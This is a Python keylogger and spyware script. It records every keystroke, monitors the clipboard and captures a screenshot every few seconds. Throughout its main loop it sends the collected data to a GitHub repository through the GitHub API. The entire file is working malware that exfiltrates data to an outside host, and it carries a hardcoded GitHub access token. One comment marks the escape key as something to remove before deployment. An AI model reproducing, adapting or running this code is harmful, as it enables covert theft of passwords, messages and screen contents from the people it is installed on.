from pynput.keyboard import Listener
from pynput import keyboard
import time

import pyautogui
import io

import requests
import base64

import threading
import pyperclip

f = open("log.txt", 'w')
f.write("")
f.close()

f = open("clip.txt", 'w')
f.write("")
f.close()


def update_github_file(token, repo_owner, repo_name, file_path, new_data, commit_message):             # updatiing logs.txt on github
    # GitHub API URL for the file
    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'

    # Get the current file content and its SHA
    response = requests.get(url, headers={'Authorization': f'token {token}'})
    if response.status_code == 200:
        file_info = response.json()
        current_content = base64.b64decode(file_info['content']).decode('utf-8')
        new_content = current_content + new_data
        
        # Prepare the new file content
        new_file_content = base64.b64encode(new_content.encode('utf-8')).decode('utf-8')
        
        # Prepare the data for the update
        data = {
            'message': commit_message,
            'content': new_file_content,
            'sha': file_info['sha']
        }
        
        # Make the PUT request to update the file
        update_response = requests.put(url, json=data, headers={'Authorization': f'token {token}'})
        
        if update_response.status_code == 200:
            print("File updated successfully.")
        else:
            print(f"Error updating file: {update_response.json()}")
    else:
        print(f"Error fetching file: {response.json()}")


def create_github_file(token, repo_owner, repo_name, file_path, content, commit_message):              # for new screenshots
    """
    Create a new file in a GitHub repository.

    Parameters:
        token (str): GitHub personal access token.
        repo_owner (str): GitHub username or organization name.
        repo_name (str): Name of the repository.
        file_path (str): Path for the new file in the repository.
        content (bytes): Content to be added to the new file (binary data, e.g., for PNG).
        commit_message (str): Commit message for the creation of the file.
    """
    # GitHub API URL for creating a file
    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'

    # Prepare the data for creating a new file
    data = {
        'message': commit_message,
        'content': base64.b64encode(content).decode('utf-8')  # Encode the content as base64
    }

    # Make the PUT request to create the file
    response = requests.put(url, json=data, headers={'Authorization': f'token {token}'})

    if response.status_code == 201:
        print("File created successfully.")
    else:
        print(f"Error creating file: {response.json()}")


def monitor_clipboard():
    old_clipboard_contents = ""

    while True:
        current_clipboard_contents=pyperclip.paste()
        
        if old_clipboard_contents!=current_clipboard_contents:
            #append if clipboard contents has changed
            with open('clip.txt', 'a') as log_file: 
                log_file.write(f"\nClipboard {time.strftime('%Y-%m-%d %H:%M:%S')} : {current_clipboard_contents}\n")
            old_clipboard_contents=current_clipboard_contents
        time.sleep(3) #run every 3 seconds


def on_press(key):
    try:
        # If the key is an alphanumeric key, get the char
        if ('0' <= key.char <= '9' or 'a' <= key.char <= 'z' or 'A' <= key.char <= 'Z'):
            log_entry = f"{key.char} "
        else:
            log_entry = key
    except AttributeError:
        # If it's a special key (e.g., Shift, Ctrl), store it with its name
        log_entry = f"{str(key)} "


    try:
        if key == keyboard.Key.esc:
            print("Esc key pressed. Exiting...")                      #escape script on pressing esc(remove before implementing)
            exit()
            return False
        else:
            with open('log.txt', 'a') as log_file:            #adding log_entry (make changes in log_entry for readability not in this)
                log_file.write(f'{log_entry}')
    except AttributeError:
        pass
    

def capture_screenshot():
    """Capture a screenshot and return its byte content."""
    screenshot = pyautogui.screenshot()  # Capture the screenshot
    with io.BytesIO() as output:
        screenshot.save(output, format='PNG')
        return output.getvalue()


clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.start()


listener = Listener(on_press=on_press)
listener.start()


while True:
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    GITHUB_TOKEN = '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'        #api valid till feb 2025
    REPO_OWNER = 'Comm1tS1thL0rd'
    REPO_NAME = 'Dump'
    FILE_PATH = 'logs.txt'
    COMMIT_MESSAGE = 'Update file.txt with new data'
    NEW_DATA = f'\n\n{current_time}\n'

    f = open("log.txt", 'r')
    data = f.readlines()
    f.close()

    f = open("log.txt", 'w')
    f.write("")
    f.close()

    f = open("clip.txt", 'r')
    clipdata = f.readlines()
    f.close()

    f = open("clip.txt", 'w')
    f.write("")
    f.close()

    for i in data:
        NEW_DATA += i
    

    screenshot_content = capture_screenshot()

    if len(data)!= 0:
        update_github_file(GITHUB_TOKEN, REPO_OWNER, REPO_NAME, FILE_PATH, NEW_DATA, COMMIT_MESSAGE)

    FILE_PATH = f'Screenshots/Screenshot_{current_time}.png'

    create_github_file(GITHUB_TOKEN, REPO_OWNER, REPO_NAME, FILE_PATH, screenshot_content, COMMIT_MESSAGE)   

    NEW_DATA = f'\n\n{current_time}\n'
    FILE_PATH = f'clipHistory.txt'

    for i in clipdata:
        NEW_DATA += i

    if len(clipdata)!= 0:
        update_github_file(GITHUB_TOKEN, REPO_OWNER, REPO_NAME, FILE_PATH, NEW_DATA, COMMIT_MESSAGE)
    
    
    time.sleep(5)                                                          # run every 30 seconds





